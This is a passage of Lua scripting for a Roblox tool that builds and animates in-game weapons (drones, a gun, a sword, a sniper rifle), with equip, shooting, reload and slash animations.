		local snwld36=weld(snprt36,snprt36,snprt35,cf(0,0.4,0))
		local snwld37=weld(snprt37,snprt37,snprt36,cf(0,0.1,0))
		table.insert(SniperWelds,snwld30)
		table.insert(SniperWelds,snwld31)
		table.insert(SniperWelds,snwld32)
		table.insert(SniperWelds,snwld33)
		table.insert(SniperWelds,snwld34)
		table.insert(SniperWelds,snwld35)
		table.insert(SniperWelds,snwld36)
		table.insert(SniperWelds,snwld37)
		numb=numb+0.3
		numb2=numb2-0.2
	end

	Bin = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)

	local Bg = it("BodyGyro") 
	Bg.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
	Bg.P = 20e+003 
	Bg.Parent = nil 

	so = function(id,par,vol,pit) 
		coroutine.resume(coroutine.create(function()
			local sou = Instance.new("Sound",par or workspace)
			sou.Volume=vol
			sou.Pitch=pit or 1
			sou.SoundId=id
			wait() 
			sou:play() 
			wait(6) 
			sou:Remove() 
		end))
	end

	function CreateDrone()
		local drone=Instance.new("Model")
		drone.Parent=modelzorz
		drone.Name="Drone"

		local dprt1=part(3,drone,0,1,BrickColor.new("White"),"DPart1",vt(1,1,1))
		dprt1.CanCollide=true
		local dprt6=part(3,drone,0,1,BrickColor.new("Bright red"),"DPart6",vt(1,1,1))
		local dprt7=part(3,drone,0,1,BrickColor.new("Black"),"DPart7",vt(1,1,1))

		local dmsh1=mesh("SpecialMesh",dprt1,"Sphere","",vt(0,0,0),vt(1,1,1))
		local dmsh6=mesh("CylinderMesh",dprt6,"","",vt(0,0,0),vt(0.5,0.2,0.5))
		local dmsh7=mesh("CylinderMesh",dprt7,"","",vt(0,0,0),vt(0.4,0.21,0.4))

		--local dwld1=weld(dprt1,dprt1,Torso,euler(0,0,0)*cf(0,-5,0))
		local dwld6=weld(dprt6,dprt6,dprt1,euler(1.57,0,0)*cf(0,0,0.4))
		local dwld7=weld(dprt7,dprt7,dprt6,cf(0,0,0))

		numb=0
		for i=1,4 do
			local dprt2=part(3,drone,0,1,BrickColor.new("Medium stone grey"),"DPart2",vt(1,1,1))
			local dmsh2=mesh("BlockMesh",dprt2,"","",vt(0,0,0),vt(0.5,0.5,0.8))
			local dwld2=weld(dprt2,dprt2,dprt1,cf(0,-0.5,0)*euler(0,0,numb))
			numb=numb+1.57
		end
		numb=0
		for i=1,4 do
			local dprt3=part(3,drone,0,1,BrickColor.new("Dark stone grey"),"DPart3",vt(1,1,1))
			local dmsh3=mesh("BlockMesh",dprt3,"","",vt(0,0,0),vt(0.5,0.5,0.79))
			local dwld3=weld(dprt3,dprt3,dprt1,cf(0,-0.3,0)*euler(0,0,0.785+numb))
			numb=numb+1.57
		end
		numb=0
		for i=1,4 do
			local dprt4=part(3,drone,0,1,BrickColor.new("Dark stone grey"),"DPart4",vt(1,1,1))
			local dmsh4=mesh("BlockMesh",dprt4,"","",vt(0,0,0),vt(0.2,0.8,0.2))
			local dwld4=weld(dprt4,dprt4,dprt1,cf(0,0.8,0)*euler(0.785,numb,0))
			local dprt5=part(3,drone,0,1,BrickColor.new("Bright blue"),"DPart5",vt(1,1,1))
			local dmsh5=mesh("SpecialMesh",dprt5,"Sphere","",vt(0,0,0),vt(0.4,0.4,0.4))
			local dwld5=weld(dprt5,dprt5,dprt4,cf(0,0.5,0)*euler(0,0,0))
			light1=Instance.new("PointLight")
			light1.Brightness=.8
			light1.Color=Color3.new(0,0,255)
			light1.Range=10
			light1.Parent=dprt5
			numb=numb+1.57
		end
		return drone,dprt1
	end

	function hideanim() 
		equipped=false
		if Mode=="Drones" then
			Mode="Choose"
		end
		wait(0.1) 
		cone.Parent=nil
		screen1.Parent=nil
		screen2.Parent=nil
		screen3.Parent=nil
		Neck.C0=necko*euler(0,0,0)
		wld9.C0=euler(0,0,0)*cf(0,0.05,0)
		Bg.Parent=nil
	end 

	function equipanim() 
		equipped=true
		if Mode=="Choose" then
			for i=0,1,0.1 do
				wait()
				Neck.C0=necko*euler(0.3*i,0,-0.2*i)
				RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.5*i) * euler(1*i,0,-1*i)
				RW.C1=cf(0, 0.5, 0) * euler(0,-2.07*i,0)
				LW.C0=cf(-1.5+0.3*i, 0.5, -0.3*i) * euler(1.5*i,0,1.2*i)
				LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			for i=0,1,0.1 do
				wait()
				wld9.C0=euler(0,-1.57*i,0)*cf(0,0.05,0)
				Neck.C0=necko*euler(0.3+0.1*i,0,-0.2-0.1*i)
				RW.C0=cf(1, 0.3, -0.5) * euler(1-0.2*i,0,-1+0.3*i)
				RW.C1=cf(0, 0.5, 0) * euler(0,-2.07-0.1*i,0)
				LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.5-0.2*i,0,1.2-0.5*i)
				LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			coroutine.resume(coroutine.create(function() 
				cone.Parent=modelzorz
				cone.Transparency=1
				local conewld=weld(cone,cone,prt9,euler(0,0,0)*cf(0,0.2,0))
				screen1.Parent=modelzorz
				screen1.Transparency=1
				local screen1wld=weld(screen1,screen1,cone,euler(0,0.8,0)*cf(0,1,0))
				screen2.Parent=modelzorz
				screen2.Transparency=1
				local screen2wld=weld(screen2,screen2,screen1,cf(0,0,1)*euler(0,0.3,0))
				screen3.Parent=modelzorz
				screen3.Transparency=1
				local screen3wld=weld(screen3,screen3,screen1,cf(0,0,-1)*euler(0,-0.3,0))

				for i=1,0.5,-0.05 do
					wait()
					cone.Transparency=i
					screen1.Transparency=i
					screen2.Transparency=i
					screen3.Transparency=i
				end
				coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
					while Mode=="Choose" do
						wait(0.06)
						Cone.Transparency=0.5
						Screen1.Transparency=0.5
						Screen2.Transparency=0.5
						Screen3.Transparency=0.5
						light1.Brightness=.7
						light2.Brightness=.7
						light3.Brightness=.7
						wait(0.06)
						Cone.Transparency=0.6
						Screen1.Transparency=0.6
						Screen2.Transparency=0.6
						Screen3.Transparency=0.6
						light1.Brightness=.8
						light2.Brightness=.8
						light3.Brightness=.8
					end
				end),cone,screen1,screen2,screen3)
			end))
			for i=0,1,0.1 do
				wait()
				wld9.C0=euler(0,-1.57,0)*cf(0,0.05,0)
				Neck.C0=necko*euler(0.4-0.7*i,0,-0.3)
				RW.C0=cf(1, 0.3, -0.5-0.3*i) * euler(0.8+0.77*i,0,-1+0.3)
				RW.C1=cf(0, 0.5, 0) * euler(0,-2.17+0.67*i,0)
				LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.3+1*i,0,0.7)
				LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			Neck.C0=necko*euler(-0.3,0,-0.3)
			RW.C0=cf(1, 0.3, -0.8) * euler(1.57,0,-0.7)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3,0,0.7)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
	end 

	function Drones()
		Mode="Drones"
		attack=true
		Humanoid.WalkSpeed=0
		coroutine.resume(coroutine.create(function() 
			while Mode=="Drones" do
				wait()
				if Aiming==false then
					DroneTarget=Torso.Position
				end
			end
		end))
		coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
			numb=0.5
			for i=0,1,0.1 do
				wait()
				Cone.Transparency=numb
				Screen1.Transparency=numb
				Screen2.Transparency=numb
				Screen3.Transparency=numb
				numb=numb+0.1
			end
			Cone.Parent=nil
			Screen1.Parent=nil
			Screen2.Parent=nil
			Screen3.Parent=nil
		end),cone,screen1,screen2,screen3)
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
			RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		local drone1,droneprt1=CreateDrone()
		local dwld1=weld(droneprt1,droneprt1,Torso,euler(0,0,0)*cf(2,0,5))
		local drone2,droneprt2=CreateDrone()
		local dwld12=weld(droneprt2,droneprt2,Torso,euler(0,0,0)*cf(0,0,5))
		local drone3,droneprt3=CreateDrone()
		local dwld13=weld(droneprt3,droneprt3,Torso,euler(0,0,0)*cf(-2,0,5))
		wait()
		dwld1:Remove()
		dwld12:Remove()
		dwld13:Remove()
		local pos=it("BodyPosition",droneprt1)
		rand1=math.random(-5,5)
		rand2=math.random(-5,5)
		pos.position=Torso.Position + vt(rand1,5,rand2)
		coroutine.resume(coroutine.create(function(BodyPosition) 
			while droneprt1.Parent~=nil do
				wait(math.random(1,3))
				BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
			end
		end),pos)
		pos.maxForce=vt(7500,7500,7500)
		pos.Name="BP"
		local bg=it("BodyGyro",droneprt1)
		bg.maxTorque=vt(math.huge,math.huge,math.huge)
		bg.P=50000
		--bg.cframe=cf(droneprt1.Position, Torso.Position)
		coroutine.resume(coroutine.create(function(BodyGyro) 
			while droneprt1.Parent~=nil do
				wait()
				if Aiming==true then
					BodyGyro.cframe=cf(droneprt1.Position, DroneTarget)
				end
			end
		end),bg)
		bg.Name="DroneGyro"
		local pos=it("BodyPosition",droneprt2)
		rand1=math.random(-5,5)
		rand2=math.random(-5,5)
		pos.position=Torso.Position + vt(rand1,5,rand2)
		coroutine.resume(coroutine.create(function(BodyPosition) 
			while droneprt2.Parent~=nil do
				wait(math.random(1,3))
				BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
			end
		end),pos)
		pos.maxForce=vt(7500,7500,7500)
		pos.Name="BP"
		local bg=it("BodyGyro",droneprt2)
		bg.maxTorque=vt(math.huge,math.huge,math.huge)
		bg.P=50000
		--bg.cframe=cf(droneprt1.Position, Torso.Position)
		coroutine.resume(coroutine.create(function(BodyGyro) 
			while droneprt2.Parent~=nil do
				wait()
				if Aiming==true then
					BodyGyro.cframe=cf(droneprt2.Position, DroneTarget)
				end
			end
		end),bg)
		bg.Name="DroneGyro"
		local pos=it("BodyPosition",droneprt3)
		rand1=math.random(-5,5)
		rand2=math.random(-5,5)
		pos.position=Torso.Position + vt(rand1,5,rand2)
		coroutine.resume(coroutine.create(function(BodyPosition) 
			while droneprt3.Parent~=nil do
				wait(math.random(1,3))
				BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
			end
		end),pos)
		pos.maxForce=vt(7500,7500,7500)
		pos.Name="BP"
		local bg=it("BodyGyro",droneprt3)
		bg.maxTorque=vt(math.huge,math.huge,math.huge)
		bg.P=50000
		--bg.cframe=cf(droneprt1.Position, Torso.Position)
		coroutine.resume(coroutine.create(function(BodyGyro) 
			while droneprt3.Parent~=nil do
				wait()
				if Aiming==true then
					BodyGyro.cframe=cf(droneprt3.Position, DroneTarget)
				end
			end
		end),bg)
		bg.Name="DroneGyro"
		droneprt1.Anchored=true
		for _,v in pairs(drone1:children()) do
			if v.className=="Part" then
				v.Transparency=1
				coroutine.resume(coroutine.create(function(Part) 
					wait(1)
					Part.Transparency=0
				end),v)
			end
		end
		effect=drone1:Clone()
		effect.Parent=workspace
		print(effect)
		for _,v in pairs(effect:children()) do
			if v.className=="Part" then
				v.Transparency=1
				v.Anchored=true
				v.CanCollide=false
				v.BrickColor=BrickColor.new("Bright blue")
				coroutine.resume(coroutine.create(function(Part) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency-0.05
					end
					wait(0.5)
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.05
					end
					Part.Parent=nil
				end),v)
			end
		end
		droneprt2.Anchored=true
		for _,v in pairs(drone2:children()) do
			if v.className=="Part" then
				v.Transparency=1
				coroutine.resume(coroutine.create(function(Part) 
					wait(1)
					Part.Transparency=0
				end),v)
			end
		end
		effect=drone2:Clone()
		effect.Parent=workspace
		print(effect)
		for _,v in pairs(effect:children()) do
			if v.className=="Part" then
				v.Transparency=1
				v.Anchored=true
				v.CanCollide=false
				v.BrickColor=BrickColor.new("Bright blue")
				coroutine.resume(coroutine.create(function(Part) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency-0.05
					end
					wait(0.5)
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.05
					end
					Part.Parent=nil
				end),v)
			end
		end
		droneprt3.Anchored=true
		for _,v in pairs(drone3:children()) do
			if v.className=="Part" then
				v.Transparency=1
				coroutine.resume(coroutine.create(function(Part) 
					wait(1)
					Part.Transparency=0
				end),v)
			end
		end
		effect=drone3:Clone()
		effect.Parent=workspace
		print(effect)
		for _,v in pairs(effect:children()) do
			if v.className=="Part" then
				v.Transparency=1
				v.Anchored=true
				v.CanCollide=false
				v.BrickColor=BrickColor.new("Bright blue")
				coroutine.resume(coroutine.create(function(Part) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency-0.05
					end
					wait(0.5)
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.05
					end
					Part.Parent=nil
				end),v)
			end
		end
		wait(2)
		droneprt1.Anchored=false
		droneprt2.Anchored=false
		droneprt3.Anchored=false
		Humanoid.WalkSpeed=16
		wait()
		effect.Parent=nil
		for i=0,1,0.1 do
			wait()
			RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-0.77*i,0,-1.3+1.3*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
			LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.5-1.5*i,0,0.2-0.4*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		attack=false
		return drone1, drone2, drone3
	end

	function Gun()
		attack=true
		Mode="Gun"
		gwld1.Part1=LeftArm
		gwld1.C0=euler(1.57+0.5,0,-1.57)*cf(0,1,0)
		coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
			numb=0.5
			for i=0,1,0.1 do
				wait()
				Cone.Transparency=numb
				Screen1.Transparency=numb
				Screen2.Transparency=numb
				Screen3.Transparency=numb
				numb=numb+0.1
			end
			Cone.Parent=nil
			Screen1.Parent=nil
			Screen2.Parent=nil
			Screen3.Parent=nil
		end),cone,screen1,screen2,screen3)
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
			RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		gun.Parent=modelzorz
		for e=1,#GunWelds do
			GunWelds[e].Parent=modelzorz
		end
		for _,v in pairs(gun:children()) do
			if v.className=="Part" then
				v.Transparency=1
			end
		end
		for _,v in pairs(gun:children()) do
			if v.className=="Part" then
				v.Transparency=1
				coroutine.resume(coroutine.create(function(Part) 
					wait(0.5)
					Part.Transparency=0
				end),v)
			end
		end
		effect=gun:Clone()
		effect.Parent=workspace
		print(effect)
		for _,v in pairs(effect:children()) do
			if v.className=="Part" then
				v.Transparency=1
				v.Anchored=true
				v.CanCollide=false
				v.BrickColor=BrickColor.new("Bright blue")
				coroutine.resume(coroutine.create(function(Part) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency-0.05
					end
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.05
					end
					Part.Parent=nil
					effect.Parent=nil
				end),v)
			end
		end
		wait(0.5)
		gwld1.Part1=LeftArm
		gwld1.C0=euler(1.57+0.5,0,-1.57)*cf(0,1,0)
		for i=0,1,0.1 do
			wait()
			gwld1.C0=euler(1.57+0.5,0,-1.57+1.57*i)*cf(0,1,0)
			RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.5*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.5-1*i,0,0.2+0.4*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
		end
		attack=false
	end

	function Sword()
		attack=true
		Mode="Sword"
		swld1.Part1=LeftArm
		swld1.C0=euler(0,0,-1.57)*cf(0,1,0)
		swld1.C1=euler(0,0,0)
		coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
			numb=0.5
			for i=0,1,0.1 do
				wait()
				Cone.Transparency=numb
				Screen1.Transparency=numb
				Screen2.Transparency=numb
				Screen3.Transparency=numb
				numb=numb+0.1
			end
			Cone.Parent=nil
			Screen1.Parent=nil
			Screen2.Parent=nil
			Screen3.Parent=nil
		end),cone,screen1,screen2,screen3)
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
			RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		sword.Parent=modelzorz
		for e=1,#SwordWelds do
			SwordWelds[e].Parent=modelzorz
		end
		for _,v in pairs(sword:children()) do
			if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
				v.Transparency=1
			end
		end
		for _,v in pairs(sword:children()) do
			if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
				v.Transparency=1
				coroutine.resume(coroutine.create(function(Part) 
					wait(0.5)
					Part.Transparency=0
				end),v)
			end
		end
		effect=sword:Clone()
		effect.Parent=workspace
		print(effect)
		for _,v in pairs(effect:children()) do
			if v.className=="Part" and v.Name~="Hitbox" and v.Name~="Mid" then
				v.Transparency=1
				v.Anchored=true
				v.CanCollide=false
				v.BrickColor=BrickColor.new("Bright blue")
				coroutine.resume(coroutine.create(function(Part) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency-0.05
					end
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.05
					end
					Part.Parent=nil
					effect.Parent=nil
				end),v)
			end
		end
		wait(0.5)
		for i=0,1,0.1 do
			wait()
			swld1.C0=euler(0,-1.57*i,1.57-3.14*i)*cf(0,1,0)
			swld1.C1=euler(0,1.57*i,0)
			RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.5*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
			LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.5-1.5*i,0,0.2-0.6*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		attack=false
	end

	function Sniper()
		attack=true
		Mode="Sniper"
		snwld1.Part1=LeftArm
		snwld1.C0=euler(0.5,0,0)*cf(0,1.6,-2)
		coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
			numb=0.5
			for i=0,1,0.1 do
				wait()
				Cone.Transparency=numb
				Screen1.Transparency=numb
				Screen2.Transparency=numb
				Screen3.Transparency=numb
				numb=numb+0.1
			end
			Cone.Parent=nil
			Screen1.Parent=nil
			Screen2.Parent=nil
			Screen3.Parent=nil
		end),cone,screen1,screen2,screen3)
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
			RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		sniper.Parent=modelzorz
		for e=1,#SniperWelds do
			SniperWelds[e].Parent=modelzorz
		end
		for _,v in pairs(sniper:children()) do
			if v.className=="Part" then
				v.Transparency=1
			end
		end
		for _,v in pairs(sniper:children()) do
			if v.className=="Part" then
				v.Transparency=1
				coroutine.resume(coroutine.create(function(Part) 
					wait(0.5)
					Part.Transparency=0
				end),v)
			end
		end
		effect=sniper:Clone()
		effect.Parent=workspace
		print(effect)
		for _,v in pairs(effect:children()) do
			if v.className=="Part" then
				v.Transparency=1
				v.Anchored=true
				v.CanCollide=false
				v.BrickColor=BrickColor.new("Bright blue")
				coroutine.resume(coroutine.create(function(Part) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency-0.05
					end
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.05
					end
					Part.Parent=nil
					effect.Parent=nil
				end),v)
			end
		end
		wait(0.5)
		gwld1.Part1=LeftArm
		snwld1.C0=euler(0.5,0,0)*cf(0,1.6,-2)
		snwld1.C1=cf(0,0,0)
		for i=0,1,0.1 do
			wait()
			snwld1.C0=euler(0.5+1.57*i,0,0)*cf(0,1.6-0.6*i,-2+2*i)
			RW.C0=cf(1, 0.3, -0.8+0.3*i) * euler(1.27-0.37*i,0,-1.3+1*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1+2.3*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-0.5*i,0,0.2+0.5*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		attack=false
	end

	function Shoot()
		attack=true
		Humanoid.WalkSpeed=2
		Bg.Parent=Head
		Bg.cframe=Head.CFrame
		for i=0,1,0.2 do
			wait()
			Neck.C0=necko*euler(0,0,0.785*i)
			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(0.5+1.07*i,0,0.6-1.385*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
		end
		spread=1
		range=50
		rangepower=70
		while hold==true and Bullets~=0 do
			for i=1,5 do
				wait(0.05)
				Bullets=Bullets-1
				so("http://roblox.com/asset/?id=10209257",gprt16,0.5,1+math.random()) 
				coroutine.resume(coroutine.create(function()
					for z = 1 ,2 do
						coroutine.resume(coroutine.create(function()
							local meshb1 = Instance.new("BlockMesh")
							meshb1.Scale = Vector3.new(1,1,1)
							light = Instance.new("PointLight")
							light.Brightness = .8
							light.Color = Color3.new(100,50,0)
							light.Range = 10
							local shellb1 = Instance.new("Part")
							light.Parent = shellb1
							meshb1.Parent = shellb1
							shellb1.Anchored = true
							shellb1.formFactor = 3
							shellb1.Size = Vector3.new(0.3,0.3,0.3) * (math.random(100,300)/100)
							shellb1.CFrame = CFrame.new((gprt16.CFrame * CFrame.new(0,-gprt16.Size.y/2,0)).p) * CFrame.Angles(math.random(-100,100)/100,math.random(-100,100)/100,math.random(-100,100)/100)
							shellb1.Parent = Character
							shellb1.Transparency = 0
							if math.random(1,2) == 1 then
								shellb1.BrickColor = BrickColor.new("Bright red")
							else
								shellb1.BrickColor = BrickColor.new("Bright orange")
							end
							shellb1.CanCollide = false
							local incre = math.random(0,60)/100
							for i = 0 , 1 , 0.1 do
								wait()
								light.Brightness = light.Brightness - .1
								shellb1.CFrame = shellb1.CFrame + Head.CFrame.lookVector*incre
								shellb1.Transparency = 1*i
								meshb1.Scale = Vector3.new(1+1*i,1+1*i,1+1*i)
							end
							shellb1.Parent=nil
						end))
					end
				end))
				shoottrail(MMouse.Hit.p,gprt16,5,1,1)
				LW.C1=cf(0, 0.5, 0) * euler(-0.2,0,0)
				wait(0.05)
				LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
		end
		spread=0
		range=500
		rangepower=50
		if Bullets==0 then
			for i=0,1,0.2 do
				wait(0)
				gwld13.C0=cf(0,0,0.3)*euler(0,1.57-1.57*i,0)
			end
			wait(0.2)
			Humanoid.WalkSpeed=16
			Bg.Parent=nil
			for i=0,1,0.1 do
				wait()
				gwld1.C0=euler(1.57+0.5,0,-1.57*i)*cf(0,1,0)
				Neck.C0=necko*euler(0.3*i,0,0.785-0.785*i)
				RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(1.2*i,0,0.2-0.4*i)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
				LW.C0=cf(-1.2+0.2*i, 0.5, -0.3-0.2*i) * euler(1.57-0.57*i,0,-0.785+0.785*i)
				LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			for i=0,1,0.1 do
				wait()
				gwld20.C0=cf(0.3*i,-0.8-0.2*i,0)*euler(0,0,1.57*i)
				RW.C0=cf(1, 0.5, -0.5) * euler(1.2-0.3*i,0,-0.2-0.1*i)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			for i=0,1,0.2 do
				wait()
				Neck.C0=necko*euler(0.3+0.2*i,0,-0.5*i)
				RW.C0=cf(1+0.5*i, 0.5, -0.5+0.5*i) * euler(0.9-1.3*i,0,-0.3)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			local ammo=Instance.new("Model")
			ammo.Parent=modelzorz
			ammo.Name="Ammo"
			local aprt1=part(3,ammo,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
			local amsh1=mesh("CylinderMesh",aprt1,"","",vt(0,0,0),vt(0.7,0.2,0.7))
			local awld1=weld(aprt1,aprt1,RightArm,cf(0,1,0))
			numb=0
			for i=1,10 do
				local aprt2=part(3,ammo,0,0,BrickColor.new("Bright yellow"),"Part2",vt(1,1,1))
				local amsh2=mesh("CylinderMesh",aprt2,"","",vt(0,0,0),vt(0.2,0.3,0.2))
				local awld2=weld(aprt2,aprt2,aprt1,cf(0.2,0.1,0)*euler(0,numb,0))
				numb=numb+0.628
			end
			for i=0,1,0.2 do
				wait()
				awld1.C0=euler(1.57,0,0)*cf(0,1+0.1*i,0)
				Neck.C0=necko*euler(0.5-0.2*i,0,-0.5+0.5*i)
				RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(-0.4+1.5*i,0,-0.3-0.1*i)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			ammo.Parent=nil
			for i=0,1,0.2 do
				wait()
				gwld20.C0=cf(0.3-0.3*i,-0.8-0.2+0.2*i,0)*euler(0,0,1.57-1.57*i)
				Neck.C0=necko*euler(0.3-0.1*i,0,-0.2*i)
				RW.C0=cf(1.5-0.5, 0.5, -0.5) * euler(1.1+0.1*i,0,-0.4+0.4*i)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			for i=0,1,0.1 do
				wait()
				gwld1.C0=euler(1.57+0.5,0,-1.57+1.57*i)*cf(0,1,0)
				gwld13.C0=cf(0,0,0.3)*euler(0,1.57*i,0)
				Neck.C0=necko*euler(0.2-0.2*i,0,-0.2+0.2*i)
				RW.C0=cf(1.5-0.5+0.5*i, 0.5, -0.5+0.5*i) * euler(1.2-1.2*i,0,0.2*i)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
				LW.C0=cf(-1-0.2*i, 0.5, -0.5+0.2*i) * euler(1-0.5*i,0,0.6*i)
				LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
			end
			Bullets=10
		else
			for i=0,1,0.1 do
				wait()
				Neck.C0=necko*euler(0,0,0.785-0.785*i)
				RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
				LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-1.57*i,0,-0.785+1.385*i)
				LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
			end
			Neck.C0=necko
			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(0.5,0,0.6)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
		end
		Bg.Parent=nil
		Humanoid.WalkSpeed=16
		attack=false
	end

	function slash1()
		attack=true
		for i=0,1,0.1 do
			wait()
			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(-0.4*i,0,-0.4-0.2*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1*i,0)
		end
		Bg.Parent=Head
		Bg.cframe=Head.CFrame
		con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,20,10) end) 
		so("http://roblox.com/asset/?id=10209640",LeftArm,1,1) 
		for i=0,1,0.2 do
			wait()
			Neck.C0=necko*euler(0,0,0.785*i)
			swld1.C0=euler(0.5*i,-1.57,-1.57)*cf(0,1,0)
			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5+0.5*i, 0.5, -0.5*i) * euler(-0.4+2.4*i,0,-0.6+1.4*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1,0)
		end
		for i=0,1,0.1 do
			wait()
--[[Neck.C0=necko*euler(0,0,0.785*i)
swld1.C0=euler(0.5*i,-1.57,-1.57)*cf(0,1,0)]]
